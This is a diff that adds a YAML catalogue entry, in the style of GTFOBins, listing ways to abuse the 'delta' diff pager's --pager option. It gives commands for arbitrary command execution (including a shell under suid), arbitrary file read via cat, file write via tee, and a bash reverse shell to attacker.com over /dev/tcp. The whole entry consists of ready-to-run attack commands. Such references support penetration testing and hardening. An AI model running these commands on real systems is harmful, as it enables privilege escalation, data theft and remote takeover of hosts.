@@ -1,0 +1,38 @@
+---
+functions:
+  command:
+  - code: |-
+      delta --pager '/path/to/command' /dev/null /path/to/input-file
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+  file-read:
+  - binary: false
+    code: |-
+      delta --pager cat /dev/null /path/to/input-file
+    comment: |-
+      The file is rendered as a diff against `/dev/null`, so the entire content is displayed as added lines with diff markup on each line.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - binary: false
+    code: |-
+      delta --pager 'tee /path/to/output-file' /dev/null /path/to/input-file
+    comment: |-
+      The output includes diff markup on each line.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      delta --pager 'bash -c "exec bash -i &>/dev/tcp/attacker.com/12345 <&1"' /dev/null /path/to/input-file
+    contexts:
+      sudo:
+      unprivileged:
+    listener: tcp-server
+...
